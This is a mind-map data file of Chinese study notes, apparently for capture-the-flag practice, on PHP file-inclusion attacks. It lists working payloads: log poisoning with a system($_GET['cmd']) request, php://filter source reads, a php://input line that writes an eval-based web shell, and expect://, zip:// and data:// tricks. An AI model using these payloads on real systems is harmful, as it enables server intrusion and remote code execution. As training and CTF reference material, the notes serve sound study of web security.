{"nodeData":{"id":"86eafee45312bbf5","topic":"文件包含","root":true,"children":[{"topic":"关键函数","id":"874563ba25dafd4a","direction":1,"children":[{"topic":"include()\n找不到被包含的文件时只产生警告 ，脚本将继续执行","id":"874566f81422d2cf"},{"topic":"include_once()     \n此语句和 include() 语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含","id":"8745671694e9186a"},{"topic":"require()\n找不到被包含的文件时会产生致命错误，并停止脚本","id":"8745673a9604242d"},{"topic":"require_once()     \n此语句和 require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含","id":"8745675d231f1863"}]},{"topic":"类型","id":"87456a9e993d9ab8","direction":0,"children":[{"topic":"LFI","id":"87456d5c95508f9e"},{"topic":"RFI","id":"87456e201530be92","children":[{"topic":"allow_url_fopen = On （默认开启）：允许通过URL打开远程文件。","id":"874570081c763478"},{"topic":"allow_url_include = On （默认关闭）：允许包含远程文件","id":"8745710c2169a2b0"}]}]},{"topic":"利用","id":"8745ff03a6335456","children":[{"topic":"借助文件上传","id":"874605814ce69197","children":[{"topic":"上传任意后缀文件","id":"87460b8d2da97e1f"},{"topic":"内容带有代码","id":"87460cd9a3676800"},{"topic":"上传路径知晓","id":"87460d14b0c0d77c"}]},{"topic":"无文件上传","id":"8746089bced05868","children":[{"topic":"日志文件","id":"874613b63c505a7f","children":[{"topic":"ssh日志包含","id":"86ec10c63680fc89","children":[{"topic":"使用ssh登录,在username出写入恶意代码,存入ssh日志,进而包含","id":"8746585da9417b04","children":[{"topic":"/var/log/secure","id":"8e154cecfcd1f6ca"},{"topic":"/var/log/auth.log","id":"8e154d29ddc46d8b"}]}]},{"topic":"日志文件(含错误日志)","id":"87464c13d3fc90bd","children":[{"topic":"Apache","id":"874657091c0adca2","children":[{"topic":"默认文件路径:/var/log/apache2/access.log（Linux）或 C:\\Apache24\\logs\\access.log（Windows）","id":"8746666bcb40cb8a"},{"topic":"默认错误文件:/var/log/apache2/error.log","id":"874679a781f23925","children":[{"topic":"GET /index.php?param=<?php system($_GET['cmd']); ?> HTTP/1.1","id":"874684403cd6d051"},{"topic":"示例漏洞代码（未过滤错误消息）\n$id = $_GET['id'];\nif (!is_numeric($id)) {\n    die(\"错误：参数 `$id` 必须为数字！\");\n}","id":"8746849bbfb36ead","children":[{"topic":"攻击者提交 id=<?php phpinfo(); ?>，错误日志中可能记录：\n[错误] 参数 `<?php phpinfo(); ?>` 必须为数字！","id":"874685ca857a30ec"}]}]}]},{"topic":"Nginx","id":"8746575fd721108b","children":[{"topic":"默认日志文件:/var/log/nginx/access.log（Linux）或 C:\\nginx\\logs\\access.log（Windows）","id":"8746790ef817a254"},{"topic":"默认错误文件:/var/log/nginx/error.log","id":"87467d6285f1f6d8"}]}]},{"topic":"session文件","id":"87464c61be943cf8","children":[{"topic":"路径由session.save_path定义（如/var/lib/php/sessions），文件名格式为sess_<session_id>（如sess_abc123）","id":"87468b9b202bef15"},{"topic":"条件","id":"87468dbc27118f64","children":[{"topic":"Session内容可控：攻击者能够向Session中注入未过滤的恶意代码（如通过用户输入参数）。\n\nSession文件路径已知：Session ID可预测或泄露，且文件路径可构造。","id":"87468ec6a3fedf69"}]},{"topic":"/var/lib/php/sess_PHPSESSID\n/var/lib/php/sessions/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID","id":"87469343dc614db1"}]}]},{"topic":"伪协议","id":"874613fd213630fb","children":[{"topic":"filter://read(write)/...../resource=xxx.php","id":"8746ab5f28b9fc8e","children":[{"topic":"例","id":"8748c6128f39ece4","children":[{"topic":"php://filter/write/resource=xxx,'文本'","id":"8748c9b796771ce3"},{"topic":"php://filter/read=convert.base64-encode/resource=xxx","id":"8748cb3e146d7650","children":[{"topic":"读取源码,编码防止代码直接执行","id":"8748d4cd1edfb99d"}]}]},{"topic":"常用转换类型","id":"8748c64aa2d23bec","children":[{"topic":"convert.base64-decode","id":"874930888c203c4d"},{"topic":"convert.quoted-printable-encode","id":"874930bf819e34b3"},{"topic":"convert.iconv.<input-encoding>.<output-encoding>","id":"874933858397789c"},{"topic":"string.strip_tags","id":"8749348aa56cb86e"},{"topic":"string.toupper","id":"8749358d0f6b50f3"},{"topic":"string.tolower","id":"874936568f4596ca"},{"topic":"string.rot13","id":"874937f47dd9439b"}]},{"topic":"非convert","id":"8748c6ba851dc4d1","children":[{"topic":"Php://filter/zlib.deflate|zlib.inflate/resource=flag.php","id":"874939057b30d193"}]},{"topic":"convert.iconv.*:用法","id":"8749289c041b9add","children":[{"topic":"convert.iconv.<input-encoding>.<output-encoding>\nor\nconvert.iconv.<input-encoding>/<output-encoding>","id":"87493c941a1f3cd9"},{"topic":"<input-encoding>和<output-encoding> 就是编码方式","id":"87493d827fe5ad9d","children":[{"topic":"UCS-4*\nUCS-4BE\nUCS-4LE*\nUCS-2\nUCS-2BE\nUCS-2LE\nUTF-32*\nUTF-32BE*\nUTF-32LE*\nUTF-16*\nUTF-16BE*\nUTF-16LE*\nUTF-7\nUTF7-IMAP\nUTF-8*\nASCII*\nEUC-JP*\nSJIS*\neucJP-win*\nSJIS-win*","id":"87493e9b7aedc55e"}]},{"topic":"php://filter//convert.iconv.SJIS*.UCS-4*/resource=/var/www/html/flag.php","id":"87493ed977a4f505"}]}]},{"topic":"php://input","id":"8746c10d9008e5bb","children":[{"topic":"<?php fputs(fopen(“shell.php”,”w”),\"<?php eval($_POST[\"cmd\"];?>\");?>","id":"8746c60f226673ce","children":[{"topic":"<?system('whoami');?>","id":"8747a8902bfdfa39"},{"topic":"注意$可能需要转义\\","id":"8782fade15db96a5"}]},{"topic":"enctype=\"multipart/form-data\" 的时候 php://input 是无效的","id":"874750f17bf99e55"},{"topic":"allow_url_include = On、不受 allow_url_fopen 影响","id":"8747530196bbd6bc"}]},{"topic":"file://(绝对路径)","id":"8746c68e2ecb7eb9"},{"topic":"expect://","id":"8746d2b1c819e6a1","children":[{"topic":"expect://ls","id":"8746db5923386160"}]},{"topic":"glob://","id":"8746d4b3232f0a20","children":[{"topic":"glob://path/*.txt列出匹配文件","id":"8746daac220c36e0"},{"topic":"查找匹配的文件路径模式，与其他函数配合绕过 open_basedir 限制，但是只可以读文件名不可以读文件内容","id":"8747944906bee61e"}]},{"topic":"压缩流","id":"874770539cee9fd3","children":[{"topic":"zip://(配合上传压缩文件)","id":"8746cc23838f499e","children":[{"topic":"可以访问压缩文件中的子文件，将子文件的内容当做 php 代码执行","id":"874764669cb64643"},{"topic":"?a=zip://D:/phpStudy/WWW/file.zip%23code.txt","id":"874766289c8e4e6d"},{"topic":"zip://[压缩包绝对路径]#[压缩包内的子文件名]","id":"8747682819f0a213"}]},{"topic":"compress.zlib://flag.php","id":"8746d9c5a1217c94","children":[{"topic":"注：\n文件路径无绝对路径限制；zlib://协议文件压缩为zip或gz都可","id":"87478082a5a208a1"}]}]},{"topic":"数据流","id":"8747854918730162","children":[{"topic":"data://text/plain,'<?phpinfo();?>'","id":"8746b674b57898c9","children":[{"topic":"或data://text/plain;base64,(base64密文)","id":"8746ce243b4be68c"}]},{"topic":"allow_url_fopen = On、allow_url_include = On","id":"874788f621ceb838"}]}]}]}]},{"topic":"tips","id":"87469f2a41e346fc","children":[{"topic":"include函数，以字符’/‘分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘/’后面的文件——注意是最后一个’/’","id":"87469ffeb68f0e56","children":[{"topic":"?file=hint.php?../../../../../../../../ffffllllaaaagggg(包含ffffllllaaaagggg)","id":"8746a242291d6dbc"}]}]}]},"linkData":{},"direction":1}